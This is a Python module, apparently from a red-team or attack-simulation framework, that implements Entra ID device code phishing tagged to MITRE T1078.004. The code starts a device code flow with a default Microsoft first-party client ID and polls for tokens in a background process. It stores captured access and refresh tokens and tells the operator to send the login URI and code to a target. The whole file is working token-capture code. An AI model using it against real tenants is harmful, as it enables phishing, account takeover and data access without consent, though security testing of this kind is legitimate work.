from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.entra_token_manager import EntraTokenManager
import requests
import time
from multiprocessing import Process

def AcquireDeviceCodeFlowToken(token_url, token_data, polling_interval):

    # poll till access token is received
    while True:
        time.sleep(polling_interval)
        token_response = requests.post(token_url, data=token_data)

        if token_response.status_code == 200:
            token_json = token_response.json()
            access_token = token_json.get('access_token')
            refresh_token = token_json.get('refresh_token', None)
            # save access and refresh token
            EntraTokenManager().add_token(access_token=access_token,refresh_token=refresh_token)
            break
        elif token_response.status_code == 400 and 'error' in token_response.json() and token_response.json()['error'] == 'authorization_pending':
            # continue polling
            print("Entra ID Device Code Flow : Polling...")
        else:
            break

@TechniqueRegistry.register
class EntraDeviceCodeFlowAuth(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1078.004",
                technique_name="Valid Accounts",
                tactics=["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"],
                sub_technique_name="Cloud Accounts"
            )
        ]
        technique_ref = [
            TechniqueReference(
                ref_title="First-party Microsoft applications reference",
                ref_link="https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications"
            ),
            TechniqueReference(
                ref_title="Microsoft Graph permissions reference",
                ref_link="https://learn.microsoft.com/en-us/graph/permissions-reference"
            )
        ]
        technique_note = [
            TechniqueNote(
                "[Input] Scope: Provide Microsoft Graph permissions. Add multiple permissions separated by space. Example Input: openid File.Read.All Directory.Read.All"
            )
        ]
        
        super().__init__("Establish Access via Device Code Flow", "Authenticates to target tenant using Entra ID device code flow", mitre_techniques, references=technique_ref, notes=technique_note)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            client_id: str = kwargs.get('client_id', 'd3590ed6-52b3-4102-aeff-aad2292ab01c')
            scope: str = kwargs.get('scope', 'https://graph.microsoft.com/.default')
            
            if client_id in [None, ""]:
                client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #set default client id

            if scope in [None, ""]:
                scope = "https://graph.microsoft.com/.default"

            endpoint_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
            
            data = {
                "client_id": client_id,
                "scope": scope+" "+"offline_access", # offline_access to request refresh token
            }

            generate_device_code_flow = requests.post(url=endpoint_url, data=data).json()

            user_code = generate_device_code_flow['user_code']
            verification_uri = generate_device_code_flow['verification_uri']
            device_code = generate_device_code_flow['device_code']
            polling_interval = generate_device_code_flow['interval']

            token_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"

            token_data = {
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code,
            }

            # creating background process to check for device code flow auth
            raw_response = Process(target = AcquireDeviceCodeFlowToken, args=(token_url, token_data, polling_interval))
            # starting process in background
            raw_response.start()

            if user_code:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully initialized device code flow auth",
                    "value": {
                        "instruction" : "Send the login URI and user code to the target to capture access token",
                        "uri" : verification_uri,
                        "user_code" : user_code,
                        "note" : "Continue with other actions after saving URI & code. When the target successfully authenticates the token will be available on Access page"
                    }
                }
            else:
                return ExecutionStatus.PARTIAL_SUCCESS, {
                    "message": "Failed to initiate device code flow",
                    "value": []
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to authenticate via device code flow"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "client_id": {"type": "str", "required": False, "default":"d3590ed6-52b3-4102-aeff-aad2292ab01c", "name": "Client ID", "input_field_type" : "text"},
            "scope": {"type": "str", "required": False, "default":"https://graph.microsoft.com/.default", "name": "Graph Permissions", "input_field_type" : "text"}
        }

